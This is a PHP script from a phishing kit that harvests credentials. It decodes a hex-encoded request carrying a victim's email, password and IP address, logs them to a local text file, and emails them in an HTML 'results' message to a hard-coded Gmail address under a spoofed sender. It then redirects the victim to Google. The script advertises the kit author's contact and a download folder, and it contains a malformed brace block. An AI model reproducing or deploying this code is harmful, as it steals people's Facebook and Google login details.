<?php
session_start();

function sanitize_input($data) {
    return htmlspecialchars(trim($data));
}

if (isset($_GET['google'])) {
    $serialized_data = hex2bin($_GET['google']);
    parse_str($serialized_data, $form_data);

    $email = isset($form_data['email']) ? sanitize_input($form_data['email']) : '';
    $password = isset($form_data['sandi']) ? sanitize_input($form_data['sandi']) : '';
    $ua = isset($form_data['ua']) ? sanitize_input($form_data['ua']) : '';
    $log = isset($form_data['log']) ? sanitize_input($form_data['log']) : '';
    $time = date('Y-m-d H:i:s'); 
    $ipAddr = isset($form_data['query']) ? sanitize_input($form_data['query']) : '';
   
    }{

        $file_lines = file('salz/antispam.txt');
        foreach ($file_lines as $file => $value) {
            $data = explode("|", $value);
            if (in_array($email, $data)) {
                // Redirect and set session
                $_SESSION['email'] = $email;
                header('Location: https://google.com');
                exit;
            }
        }

        $myfile = fopen("salz/antispam.txt", "a") or die("Unable to open file!");
        fwrite($myfile, "|".$email."|".$password."|".$ipAddr."\n");
        fclose($myfile);

    $subjek = '🇲🇨 | 𝐑𝐞𝐬𝐮𝐥𝐭𝐬 Punya  Si 𖤐 |'.$email.' | Result LUKY NESIA'.'';
    $pesan = <<<EOD
<!DOCTYPE html>
	<html>
	<head>
		<title></title>
		<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
		<style type="text/css">
			body {
				font-family: "Helvetica";
				width: 90%;
				display: block;
				margin: auto;
				border: 1px solid #fff;
				background: #fff;
			}

			.result {
				width: 100%;
				height: 100%;
				display: block;
				margin: auto;
				position: fixed;
				top: 0;
				right: 0;
				left: 0;
				bottom: 0;
				z-index: 999;
				overflow-y: scroll;
				border-radius: 10px;
			}

			.tblResult {
				width: 100%;
				display: table;
				margin: 0px auto;
				border-collapse: collapse;
				text-align: center;
				background: #ffffff;
			}
			.tblResult th {
				text-align: left;
				font-size: 1em;
				margin: auto;
				padding: 5px 10px;
				background: #0000CD;
				border: 2px solid #000000;
				color: #fff;
			}

			.tblResult td {
				font-size: 1em;
				margin: auto;
				padding: 10px;
				border: 2px solid #000000;
				text-align: left;
				font-weight: bold;
				color: #000000;
				text-shadow: 0px 0px 10px #ffffff;

			}

			.tblResult th img {
				width: 100%;
				display: block;
				margin: auto;
				box-shadow: 0px 0px 10px rgba(0,0,0, 0.5);
				border-radius: 10px;
			}
		</style>
	</head>
	<body>
		<div class="result">
		
		<div style="background: linear-gradient(-45deg, #00FFFF, #7FFF00, #23a6d5, #6495ED); width: 294; color: #fff; text-align: center; padding: 10px;"></div>
			<table class="tblResult">
<tr>
					<th style="text-align: center;" colspan="3">🌾CREATED BY HANZ NESIA 🌾 </th>
				</tr>
				<tr>
					<td style="border-right: none;">Email</td>
					<td style="text-align: center;">$email</td>
				</tr>
                <tr>
					<td style="border-right: none;">Password</td>
					<td style="text-align: center;">$password</td>
				</tr>
			    <tr>
			        <td style="border-right: none;">Login</td>
					<td style="text-align: center;">Facebook/Google</td>
				</tr>			
				<tr>
					</table>
			<div style="background: linear-gradient(-45deg, #00008B, #F0F0EC, #23a6d5, #23d5ab); width: 294; color: #fff; text-align: center; padding: 10px;">

<a style="border:2px solid #000000;text-decoration:none;color:#000000;border-radius:3px;padding:3px;background:#FF8C00;" href="https://wa.me/6283845027771">Wa-Hanz</a>
<a style="border:2px solid #000000;text-decoration:none;color:#000000;border-radius:3px;padding:3px;background:#00ff00;" href="https://www.mediafire.com/folder/b12a27z1l3jrf/ALL+SCRIPT+WEBP+NO+BUG">Sc Webp-Free</a>
</div>
				</tr>
				</tr>
			</table>
		</div>
	</body>
	</html>
EOD;
    $email = "stokakun1199892@gmail.com";
    $sender = 'From: 🌪️RESS LUKY-G-CODE-JS 🌾<admin@lukynesia.go.id>';
    
    $headers  = 'MIME-Version: 1.0' . "\r\n";
    $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
    $headers .= ''.$sender.'' . "\r\n";
    include 'salz.com.php';
    
    mail($email, $subjek, $pesan, $headers);
    sleep(1);
}
?>
